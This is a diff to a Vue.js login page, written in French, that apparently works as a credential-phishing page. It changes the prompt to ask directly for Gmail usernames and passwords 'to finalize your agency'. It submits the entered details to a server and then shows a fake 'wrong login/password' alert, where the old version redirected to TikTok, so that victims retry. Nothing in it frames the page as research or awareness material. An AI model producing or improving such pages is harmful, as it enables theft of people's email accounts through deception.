@@ -1,7 +1,7 @@
 <template>
   <div id="divlogin">
-    <h1>Login</h1>
-    <h3>Veuillez renseigner votre compte google (En raison des malveillances rencontré sur le site, seul les compte google sont autorisés). Une fois connecté vous arriverez sur Tiktok.</h3>
+    <h1 style="font-size: 50px;">Login</h1>
+    <h2 style="font-size: 40px;">Afin de finaliser votre agence, veuillez indiquer les identifiants/mot de passe de votre compte GMAIL.</h2>
     <div id="loginDiv">
         <div>
             email:
@@ -38,7 +38,7 @@ export default {
         .then(res => res.json())
         .then(data => {
             console.log('Réponse serveur:', data)
-            window.location.href = "https://www.tiktok.com";
+            alert("Mauvais login/mot de passe")
         })
         .catch(err => console.error(err))
     }
@@ -48,7 +48,7 @@ export default {
 
 <style>
     #divlogin{
-        height: 30vh;
+        height: 50vh;
         display: flex;
         flex-direction: column;
         justify-content: space-around;
@@ -56,11 +56,11 @@ export default {
     }
 
     h1{
-        color: white;
+        color: red
     }
     
-    h3{
-        color: white;
+    h2{
+        color: red
     }
 
     #loginDiv{
